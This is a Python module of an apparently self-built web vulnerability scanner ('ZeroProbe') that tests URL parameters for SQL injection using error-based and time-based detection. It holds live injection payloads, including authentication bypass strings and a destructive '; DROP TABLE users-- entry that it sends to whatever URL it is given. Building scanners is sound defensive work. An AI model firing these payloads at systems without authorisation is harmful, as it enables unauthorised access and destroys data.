# scanner/sqli_scanner.py — ZeroProbe
# SQL Injection detection: error-based and time-based fingerprinting

import re
import time
import requests
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

PAYLOADS = [
    {"payload": "'",                               "type": "Single Quote Test",      "technique": "Error-Based",     "risk": "High"},
    {"payload": "''",                              "type": "Double Single Quote",    "technique": "Error-Based",     "risk": "Medium"},
    {"payload": "' OR '1'='1",                    "type": "Always-True String",     "technique": "Boolean-Based",   "risk": "Critical"},
    {"payload": "' OR '1'='1'--",                 "type": "Comment Auth Bypass",    "technique": "Boolean-Based",   "risk": "Critical"},
    {"payload": "' OR 1=1--",                     "type": "Numeric Always-True",    "technique": "Boolean-Based",   "risk": "Critical"},
    {"payload": "\" OR \"1\"=\"1",                "type": "Double Quote Bypass",    "technique": "Boolean-Based",   "risk": "Critical"},
    {"payload": "' OR 1=1#",                      "type": "MySQL Hash Comment",     "technique": "Boolean-Based",   "risk": "Critical"},
    {"payload": "admin'--",                        "type": "Admin Auth Bypass",      "technique": "Auth Bypass",     "risk": "Critical"},
    {"payload": "1' ORDER BY 1--",                "type": "ORDER BY Column Count",  "technique": "UNION-Based",     "risk": "High"},
    {"payload": "1' UNION SELECT NULL--",         "type": "UNION NULL (1-col)",     "technique": "UNION-Based",     "risk": "Critical"},
    {"payload": "1' UNION SELECT NULL,NULL--",    "type": "UNION NULL (2-col)",     "technique": "UNION-Based",     "risk": "Critical"},
    {"payload": "' AND SLEEP(3)--",               "type": "MySQL Time Delay",       "technique": "Time-Based Blind", "risk": "High"},
    {"payload": "' WAITFOR DELAY '0:0:3'--",      "type": "MSSQL Time Delay",       "technique": "Time-Based Blind", "risk": "High"},
    {"payload": "1 AND 1=1",                       "type": "Always-True (Numeric)", "technique": "Boolean-Based",   "risk": "High"},
    {"payload": "1 AND 1=2",                       "type": "Always-False (Numeric)","technique": "Boolean-Based",   "risk": "High"},
    {"payload": "' OR 'x'='x",                   "type": "String Comparison Bypass","technique": "Boolean-Based",  "risk": "Critical"},
    {"payload": "%20OR%201=1",                    "type": "URL-Encoded OR 1=1",     "technique": "Boolean-Based",   "risk": "High"},
    {"payload": "'; DROP TABLE users--",           "type": "DROP TABLE Stacked",    "technique": "Stacked Queries", "risk": "Critical"},
]

SQL_ERRORS = [
    (r"you have an error in your sql syntax",            "MySQL"),
    (r"warning:\s*mysql",                                "MySQL"),
    (r"mysql_fetch",                                     "MySQL"),
    (r"valid mysql result",                              "MySQL"),
    (r"column count doesn't match",                      "MySQL"),
    (r"table '.*?' doesn't exist",                       "MySQL"),
    (r"unknown column '.*?' in",                         "MySQL"),
    (r"unclosed quotation mark",                         "MSSQL"),
    (r"microsoft ole db provider for sql server",        "MSSQL"),
    (r"odbc sql server driver",                          "MSSQL"),
    (r"syntax error.*?near",                             "MSSQL / SQLite"),
    (r"quoted string not properly terminated",           "Oracle"),
    (r"ora-\d{5}",                                       "Oracle"),
    (r"pg_query\(\)",                                    "PostgreSQL"),
    (r"supplied argument is not a valid (mysql|pg)",     "Generic SQL"),
    (r"sqlite_",                                         "SQLite"),
    (r"sqlstate",                                        "Generic SQL"),
    (r"jdbc",                                            "Java/JDBC"),
]

RISK_META = {
    "Critical": {
        "description": "Critical SQL injection enables full database compromise, authentication bypass, and potential server-level access via stacked queries or UDF abuse.",
        "recommendation": "Replace all dynamic SQL with parameterized queries or an ORM. Principle of least privilege on DB accounts. Enable WAF with SQLi signatures.",
    },
    "High": {
        "description": "High-severity SQL injection can extract sensitive data, modify records, or be used to fingerprint the backend database engine.",
        "recommendation": "Migrate all database interactions to prepared statements. Suppress all database error messages in production responses.",
    },
    "Medium": {
        "description": "Potential SQL injection indicator detected. Requires further manual validation to confirm exploitability.",
        "recommendation": "Audit input handling for this parameter. Apply strict server-side input validation and parameterized queries.",
    },
}

SCAN_HEADERS = {"User-Agent": "Mozilla/5.0 (ZeroProbe Security Scanner)"}


def scan_sqli(url: str) -> list:
    results = []
    parsed  = urlparse(url)
    params  = parse_qs(parsed.query)
    test_params = list(params.keys())[:3] if params else ["id", "page", "cat"]

    for param in test_params:
        for item in PAYLOADS:
            payload  = item["payload"]
            base_p   = {k: (v[0] if isinstance(v, list) else v)
                        for k, v in params.items()} if params else {param: "1"}
            base_p[param] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(base_p)))

            found, db_type, detection = False, "Unknown", "Pattern Match"
            try:
                t0 = time.time()
                r  = requests.get(test_url, timeout=14, headers=SCAN_HEADERS, verify=False)
                elapsed = time.time() - t0

                # Error-based detection
                for pattern, db in SQL_ERRORS:
                    if re.search(pattern, r.text, re.IGNORECASE):
                        found, db_type, detection = True, db, "Error-Based"
                        break

                # Time-based blind detection
                if not found and elapsed >= 2.8:
                    pu = payload.upper()
                    if "SLEEP" in pu or "WAITFOR" in pu or "DELAY" in pu:
                        found, detection = True, "Time-Based Blind"

                meta = RISK_META.get(item["risk"], RISK_META["Medium"]) if found else {}
                results.append({
                    "payload":        payload,
                    "type":           item["type"],
                    "technique":      item["technique"],
                    "parameter":      param,
                    "vulnerable":     found,
                    "risk":           item["risk"] if found else "None",
                    "db_type":        db_type if found else "N/A",
                    "detection":      detection if found else "None",
                    "url":            test_url,
                    "status":         r.status_code,
                    "description":    meta.get("description", ""),
                    "recommendation": meta.get("recommendation", ""),
                })
                if found:
                    break
            except Exception as e:
                results.append({
                    "payload": payload, "type": item["type"],
                    "technique": item["technique"], "parameter": param,
                    "vulnerable": False, "risk": "None",
                    "url": test_url, "error": str(e),
                })

    seen, deduped = set(), []
    for r in results:
        if r["payload"] not in seen:
            seen.add(r["payload"])
            deduped.append(r)
    return deduped
